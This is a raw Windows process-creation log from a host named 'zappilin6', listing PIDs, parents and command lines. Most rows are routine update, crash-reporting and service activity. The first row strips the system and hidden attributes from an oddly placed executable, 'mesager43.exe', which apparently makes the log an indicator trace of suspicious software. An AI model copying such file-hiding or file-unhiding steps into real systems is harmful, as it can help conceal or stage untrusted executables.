+56"."zappilin6"."11256"."10632"."10628"."attrib.exe"."attrib  -s -h "C:\ssd\onset\mesager43.exe"
+56"."zappilin6"."10108"."10632"."10628"."timeout.exe"."timeout  4
+56"."zappilin6"."10592"."2216"."8948"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV 2haV04KrwUW0EO8S.1.3 -SendFullTelemetry -ThrottleUtc
+56"."zappilin6"."5240"."10336"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+56"."zappilin6"."5344"."9160"."5240"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 428 -p 11108 -ip 11108
+56"."zappilin6"."10704"."9160"."11108"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 11108 -s 1984
+56"."zappilin6"."10944"."2236"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+56"."zappilin6"."11144"."5696"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+56"."zappilin6"."10280"."8224"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+56"."zappilin6"."10684"."10668"."9976"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+56"."zappilin6"."6384"."8224"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+56"."zappilin6"."5432"."1976"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+56"."zappilin6"."3456"."3052"."10272"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+56"."zappilin6"."828"."11036"."11040"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+56"."zappilin6"."9608"."6772"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 5d6dd037-0548-46d0-8c04-f08956ec5acf /RunHandlerComServer
+56"."zappilin6"."1240"."3400"."10080"."MpSigStub.exe"."C:\Windows\TEMP\8E6EA870-1A0D-4082-9375-5759C5DB8F4E\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
